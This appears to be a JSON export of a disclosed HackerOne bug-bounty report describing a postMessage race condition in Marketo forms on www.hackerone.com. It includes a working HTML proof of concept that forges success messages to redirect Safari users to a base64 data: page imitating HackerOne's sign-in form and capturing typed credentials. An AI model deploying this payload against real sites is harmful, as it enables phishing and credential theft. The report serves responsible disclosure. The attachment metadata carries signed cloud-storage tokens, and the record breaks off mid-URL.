@@ -1,0 +1,463 @@
+{
+  "id": 381356,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODEzNTY=",
+  "url": "https://hackerone.com/reports/381356",
+  "title": "Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-13T21:26:07.983Z",
+  "submitted_at": "2018-07-13T21:26:07.983Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-04-05T17:26:23.824Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-04-05T17:25:46.176Z",
+  "team_member_agreed_on_going_public_at": "2019-04-05T17:26:23.659Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nI made a talk earlier this month about Client-Side Race Conditions for postMessage on AppSecEU:\n\nhttps://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies\n\nIn this talk I mention some fun ways to race postMessages from a malicious origin before the legit source sends it.\n\n### Background\n\nAs you remember from #207042 you use Marketo for your form-submissions on `www.hackerone.com`.\n\nNow, back then, I abused the fact that no origin was checked on the receiving end of marketo.com. By doing this I was then able to steal the data being submitted.\n\n### Technical Description\n\nIn this case however, I noticed that as soon as you submit a form, one of the listener being on `www.hackerone.com` will pass the content forward to a handler for the specific form that was loaded.\n\nAs soon as it finds the form that was initiated and submitted, it will either run the `error` or `success`-function based on the content of the postMessage. If the message is a success, it will run any `form.onSuccess` being defined when the form was loaded. You can see some of these in this file:   \n\nhttps://www.hackerone.com/sites/default/files/js/js_pdV-E7sfuhFWSyRH44H1WwxQ_J7NeE2bU6XNDJ8w1ak.js\n\n```js\n      form.onSuccess(function() {\n        return false;\n      }); \n```\n\nIf the `onSuccess` returns `false` nothing more will happen. However, if the `onSuccess` doesn't exist or returns `true`, the parameter called `followUpUrl` will instead be sent to `location.href`.\n\nThere is no check whatsoever what this URL contains. The code does parse the URL and if a parameter called `aliId` is set it will append it to the URL.\n\nAs you might now, the flow of the Marketo-solution looks like this:\n\n1. Form is initiated by loading a JS-file from Marketo.\n2. Form shows up on www.hackerone.com\n3. Form is submitted. Listener is now initiated on www.hackerone.com\n4. Message is sent to Marketo from www.hackerone.com using postMessage\n5. Marketo gets the message and runs an ajax call to save it on Marketo\n6. When successful, a postMessage is sent from Marketo back to www.hackerone.com with the status. The listener catches the response and checks `onSuccess`.\n7. If onSuccess gives false, don't do anything. If it doesn't exists or returns `true`, follow the `followUpUrl`.\n\n### Exploitation\n\nSince no origin check is made on the listener initated in #3, we can from our end try to race the message between #3 and #6. If our message comes through we can direct the user to whatever location we like if we find a form that doesn't utilize `onSuccess`.\n\n#### Forms on www.hackerone.com\n\nLooking at the forms, we can see that one being initiated called `mktoForm_1013` does not have any `onSuccess`-function on it. This means that we can now use the `followUpUrl` from the postMessage to send the user to our location. We can also see in the URL of your JS-code above that the following URLs contains `mktoForm_1013`:\n\n```js\n      if (location.pathname == \"/product/response\") {\n        $('#mktoForm_1013 .mktoHtmlText p').text('Want to get up and running with HackerOne Response? Give us a few details and we’ll be in touch shortly!');\n      }\n      else if (location.pathname == \"/product/bounty\") {\n        $('#mktoForm_1013 .mktoHtmlText p').text('Want to tap into the ultimate level of hacker-powered security with HackerOne Bounty? Give us a few details and we’ll be in touch shortly!');\n      }\n      else if (location.pathname == \"/product/challenge\") {\n        $('#mktoForm_1013 .mktoHtmlText p').text('Up for a HackerOne Challenge? Want to learn more? Give us a few details and we’ll be in touch shortly!');\n      }\n      else if (location.pathname == \"/services\") {\n        $('#mktoForm_1013 .mktoHtmlText p').text(\"We're looking forward to serving you. Give us a few details and we’ll be in touch shortly!\");\n      }\n      else if (location.pathname == \"/\") {\n        $('#mktoForm_1013 .mktoHtmlText p').text(\"Start uncovering critical vulnerabilities today. Give us a few details and we’ll be in touch shortly!\");\n      }\n```\n\nAnd as before in the old report, we know that `#contact` as the fragment will open the form directly without interaction.\n\n#### CSP\n\nDue to your CSP, we cannot send the user to `javascript:`. If your CSP would have allowed it, we would have a proper XSS on www.hackerone.com. Chrome and Firefox also disallows sending the user to a `data:`-URL. We can send the user to any location we like, but that's no fun.\n\n...but...\n\n...enter Safari.\n\nSafari does not restrict top-navigation to `data:` (tested in macOS 10.13.5, Safari 11.1.1). This means that we can do the following:\n\n1. Have a malicious page opening `https://www.hackerone.com/product/response#contact`\n2. Make it send a bunch of messages saying the form as successfully submitted.\n3. When the victim fills in the form and submits, our message will hopefully win, since Marketo needs to both get the postMessage and send an ajax call to save the response until it sends a legit response. \n4. We redirect the user to a very good-looking sign-in page for HackerOne.\n5. ??? \n6. PROFIT!!!\n\n\n\n### PoC\n\nWhen trying this attack I noticed that if Safari opens www.hackerone.com in a new tab instead of a new window, Safari counts the tab as inactive and will slow down the sending of postMessages to the current frame. However, if you open www.hackerone.com in a complete new window, using `window.open(url,'','_blank')`, Safari will not count the old window as inactive and the messages will be sent just as fast which will significantly increase our chance of winning the race.\n\nThe following HTML should show you my PoC in Safari:\n\n```html\n<html>\n<head>\n<script>\nvar b;\nfunction doit() {\n\tsetInterval(function() {\n\t\tb.postMessage('{\"mktoResponse\":{\"for\":\"mktoFormMessage0\",\"error\":false,\"data\":{\"formId\":\"1013\",\"followUpUrl\":\"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0iYWxlcnRzIj4KPC9kaXY+PGRpdiBjbGFzcz0ianMtYXBwbGljYXRpb24tcm9vdCBmdWxsLXNpemUiPjxzcGFuIGRhdGEtcmVhY3Ryb290PSIiPjxkaXYgY2xhc3M9ImZ1bGwtc2l6ZSBhcHBsaWNhdGlvbl9mdWxsX3dpZHRoX2xheW91dCI+PGRpdj48ZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zaWduZWQtb3V0Ij48ZGl2IGNsYXNzPSJpbm5lci1jb250YWluZXIiPjxkaXY+PGEgY2xhc3M9ImFwcF9fbG9nbyIgaHJlZj0iLyI+PGltZyBzcmM9Imh0dHBzOi8vaGFja2Vyb25lLmNvbS9hc3NldHMvc3RhdGljL2ludmVydGVkX2xvZ28tYzA0MzBhZjgucG5nIiBhbHQ9IkhhY2tlck9uZSI+PC9hPjxkaXYgY2xhc3M9InRvcGJhci10b2dnbGUiPjxpIGNsYXNzPSJpY29uLWhhbWJ1cmdlciI+PC9pPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWJuYXYtd3JhcHBlciI+PHVsIGNsYXNzPSJ0b3BiYXItc3VibmF2Ij48bGkgY2xhc3M9InRvcGJhci1zdWJuYXYtaXRlbSI+PGEgY2xhc3M9InRvcGJhci1zdWJuYXYtbGluayIgaHJlZj0iL3VzZXJzL3NpZ25faW4iPlNpZ24gSW48L2E+Jm5ic3A7fCZuYnNwOzwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItc3VibmF2LWl0ZW0iPjxhIGNsYXNzPSJ0b3BiYXItc3VibmF2LWxpbmsiIGhyZWY9Ii91c2Vycy9zaWduX3VwIj5TaWduIFVwPC9hPjwvbGk+PC91bD48L2Rpdj48ZGl2IGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi13cmFwcGVyIj48dWwgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uIj48bGkgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uLWl0ZW0iPjxzcGFuIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1kZXNrdG9wLWxpbmsiPjxhIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1saW5rIj5Gb3IgQnVzaW5lc3M8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Rm9yIEhhY2tlcnM8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayIgaHJlZj0iL2hhY2t0aXZpdHkiPkhhY2t0aXZpdHk8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Q29tcGFueTwvYT48L3NwYW4+PC9saT48bGkgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uLWl0ZW0iPjxzcGFuIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1kZXNrdG9wLWxpbmsiPjxhIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1saW5rIiBocmVmPSIvdXNlcnMvc2lnbl9pbiI+VHJ5IEhhY2tlck9uZTwvYT48L3NwYW4+PC9saT48L3VsPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWIiPjwvZGl2PjwvZGl2PjxzcGFuPjwvc3Bhbj48L2Rpdj48ZGl2IGNsYXNzPSJmdWxsLXdpZHRoLWNvbnRhaW5lciIgc3R5bGU9InBhZGRpbmctdG9wOiAxNTBweDsiPjxkaXYgY2xhc3M9Im5hcnJvdy13cmFwcGVyIj48ZGl2Pjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRwczovL2hhY2tlcm9uZS5jb20vdXNlcnMvc2lnbl9pbiIgb25zdWJtaXQ9ImFsZXJ0KCdpIGdvdCBpdDogJyArIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWduX2luX2VtYWlsJykudmFsdWUgKyAnOicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaW5wdXQtNCcpLnZhbHVlKTsgcmV0dXJuIGZhbHNlOyIgbm92YWxpZGF0ZT0iIiBjbGFzcz0ic3BlYy1zaWduLWluLWZvcm0iPjxkaXY+PGgxIGNsYXNzPSJzZWN0aW9uLXRpdGxlIHRleHQtYWxpZ25lZC1jZW50ZXIiPlNpZ24gaW4gdG8gSGFja2VyT25lPC9oMT48ZGl2IGNsYXNzPSJuYXJyb3ctY29udGFpbmVyIj48ZGl2IGNsYXNzPSJpbnB1dC13cmFwcGVyIj48bGFiZWwgY2xhc3M9ImlucHV0LWxhYmVsIiBmb3I9InNpZ25faW5fZW1haWwiPkVtYWlsIGFkZHJlc3M8L2xhYmVsPjxpbnB1dCB0eXBlPSJlbWFpbCIgY2xhc3M9ImlucHV0IHNwZWMtc2lnbi1pbi1lbWFpbCIgbmFtZT0idXNlcltlbWFpbF0iIHZhbHVlPSIiIGlkPSJzaWduX2luX2VtYWlsIiBhdXRvY29tcGxldGU9Im9uIj48ZGl2IGNsYXNzPSJoZWxwZXItdGV4dCI+VXNpbmcgU0FNTD8gRW1haWwgYWRkcmVzcyBvbmx5LCBubyBwYXNzd29yZCBuZWVkZWQuPC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0iaW5wdXQtd3JhcHBlciI+PGxhYmVsIGNsYXNzPSJpbnB1dC1sYWJlbCIgZm9yPSJpbnB1dC00Ij5QYXNzd29yZDwvbGFiZWw+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iaW5wdXQgc3BlYy1zaWduLWluLXBhc3N3b3JkIiBuYW1lPSJ1c2VyW3Bhc3N3b3JkXSIgdmFsdWU9IiIgaWQ9ImlucHV0LTQiIGF1dG9jb21wbGV0ZT0ib24iIG1heGxlbmd0aD0iNzIiPjwvZGl2PjxkaXYgY2xhc3M9ImlucHV0LXdyYXBwZXItc21hbGwiPjxkaXYgY2xhc3M9InJlbWVtYmVyLW1lIj48aW5wdXQgdHlwZT0iY2hlY2tib3giIGlkPSJ1c2VyX3JlbWVtYmVyX21lIiBuYW1lPSJ1c2VyW3JlbWVtYmVyX21lXSIgY2xhc3M9InNwZWMtc2lnbi1pbi1yZW1lbWJlci1tZSIgdmFsdWU9IjEiPjxsYWJlbCBmb3I9InVzZXJfcmVtZW1iZXJfbWUiPlJlbWVtYmVyIG1lIGZvciB0d28gd2Vla3M8L2xhYmVsPjwvZGl2PjxhIGhyZWY9Ii91c2Vycy9wYXNzd29yZC9uZXciIGNsYXNzPSJmb3Jnb3QtcGFzc3dvcmQiPkZvcmdvdCB5b3VyIHBhc3N3b3JkPzwvYT48ZGl2IGNsYXNzPSJjbGVhcmZpeCI+PC9kaXY+PC9kaXY+PGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiBidXR0b24tLXN1Y2Nlc3MgaXMtZnVsbC13aWR0aCBzcGVjLXNpZ24taW4tc3VibWl0IiBuYW1lPSJjb21taXQiIHZhbHVlPSJTaWduIGluIj48L2Rpdj48ZGl2IGNsYXNzPSJuYXJyb3ctZm9vdGVyIj5ObyBhY2NvdW50IHlldD8gPGEgaHJlZj0iL3VzZXJzL3NpZ25fdXAiPkNyZWF0ZSBhbiBhY2NvdW50LjwvYT48L2Rpdj48ZGl2IGNsYXNzPSJjbGVhcmZpeCI+PC9kaXY+PC9kaXY+PC9mb3JtPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pjwvc3Bhbj48L2Rpdj48bm9zY3JpcHQ+PGRpdiBjbGFzcz0ianMtZGlzYWJsZWQiPkl0IGxvb2tzIGxpa2UgeW91ciBKYXZhU2NyaXB0IGlzIGRpc2FibGVkLiBUbyB1c2UgSGFja2VyT25lLCBlbmFibGUgSmF2YVNjcmlwdCBpbiB5b3VyIGJyb3dzZXIgYW5kIHJlZnJlc2ggdGhpcyBwYWdlLjwvZGl2Pjwvbm9zY3JpcHQ+PC9ib2R5Pg==\",\"aliId\":null}}}','*');\nconsole.log('send...')\n\t}, 10);\n}\n</script>\n</head>\n<body>\n<a href=\"#\" onclick=\"b=window.open('https://www.hackerone.com/product/response#contact','b','_blank'); doit(); return false;\" target=\"_blank\">Click me and send something</a></body>\n</html>\n```\n\nIt's large, but it also contains your login page.\n\n## 1. User clicks on the malicious page:\n\n{F320358}\n\n## 2. User fills in the contact form and submits\n\n{F320359}\n\n## 3. User gets directly redirected to our data-page\n\n{F320360}\n\n## 4. If they sign in we will steal the creds:\n\n{F320361}\n\n## PoC-movie\n\nHere's a movie showing the scenario:\n\n{F320362}\n\n## Impact\n\nI'm pretty divided on the impact of this. You could argue that this is similar to opening www.hackerone.com from a page, that will on a later time redirect the user to `data:`, which is fully possible and probably just as sneaky.\n\nThe only difference would be that this could be properly fixed and the logic of the listener in this case actually enables the attacker to fool the user related to the interaction with the site.\n\nAlso, most likely a lot of other customers of Marketo are affected by this and if they lack CSP, there will be XSS:es all over the place.\n\nAlso, if IE11 would support those contact-popups, it would be an XSS due to the lack of CSP-support, however now I'm getting a JS-error trying to open the contact-form... :)\n\n## Mitigation\n\nWhat's interesting here though is that you can actually mitigate this easily by making sure you always use `onSuccess=function(){return false}` to always make sure `followUpUrl` won't be used. \n\nRegards,\nFrans",
+  "bounty_amount": "1250.0",
+  "formatted_bounty": "$1,250",
+  "weakness": {
+    "id": 65,
+    "name": "Business Logic Errors"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 320358,
+      "file_name": "malicious.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/358/60cd761e14b1c2e6492f5acaebb61e841df8cf83/malicious.png?response-content-disposition=attachment%3B%20filename%3D%22malicious.png%22%3B%20filename%2A%3DUTF-8%27%27malicious.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074428Z&X-Amz-Expires=438&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VXRBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55dc0ef18c35f625cb4bad2c9aaf9c41908e62b53543fef680eb90d0a9595de4",
+      "file_size": 299135,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 320359,
+      "file_name": "contact.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/359/fd4fef36c0312e8c6952f8b9f0c90fc5c66fc2a1/contact.png?response-content-disposition=attachment%3B%20filename%3D%22contact.png%22%3B%20filename%2A%3DUTF-8%27%27contact.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074428Z&X-Amz-Expires=438&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VXRBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f10ee1e7751797d699244bdd7504f2f389708be854c9417302a9bf4754a9f813",
+      "file_size": 1158189,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 320360,
+      "file_name": "sign-in.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/360/fd710781dbff34f09c3421e277d925f028909746/sign-in.png?response-content-disposition=attachment%3B%20filename%3D%22sign-in.png%22%3B%20filename%2A%3DUTF-8%27%27sign-in.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074428Z&X-Amz-Expires=438&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VXRBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d5700244da1e7d20896b5824be7c9ea09dfc5704761fbe2e9765a35411341abf",
+      "file_size": 188068,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 320361,
+      "file_name": "popup.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/320/361/bd6095a3db57b9885c78c9397003d4ed8a3b8e53/popup.png?response-content-disposition=attachment%3B%20filename%3D%22popup.png%22%3B%20filename%2A%3DUTF-8%27%27popup.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074428Z&X-Amz-Expires=438&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VX